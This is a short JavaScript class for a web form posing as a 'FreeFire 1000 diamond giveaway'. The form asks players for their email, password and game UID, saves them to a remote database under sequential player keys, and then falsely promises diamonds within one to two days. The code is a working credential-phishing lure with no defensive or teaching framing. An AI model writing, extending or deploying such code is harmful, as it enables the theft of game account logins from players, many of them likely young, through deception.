class Form {
  constructor() {
    this.input1 = createInput();
    this.input2 = createInput();
    this.input3 = createInput();
    this.count = 0;
    // this.title = createElement('h2');
    this.title2 = createElement('h2');
    this.button = createButton("SUBMIT");
    this.image = loadImage("img/diamond.png");
    this.image2 = loadImage("img/BG2.png");
  }

  display() {
    // this.title.html("→ FREEFIRE 1000 DIAMOND GIVEAWAY");
    // this.title.position(240, 600);
    // this.title.style('color', 0);


    this.button.position(440, 440);

    this.input1.position(440, 300);
    this.input2.position(440, 350);
    this.input3.position(440, 250);

    this.button.mousePressed(() => {
      this.count += 1;
      database.ref('player' + this.count).update({
        pas: this.input2.value(),
        mail: this.input1.value(),
        uid: this.input3.value()
      });

      this.title2.html("after 1-2 Days you have diamond in your mail Box");
      this.title2.position(225, 400);
      this.title2.style('color', 0);

      this.button.hide();
      });

      image(this.image, width/2 - 40, 500, 100, 100);
      image(this.image2, 80, 130, 440, 200);
  }
}
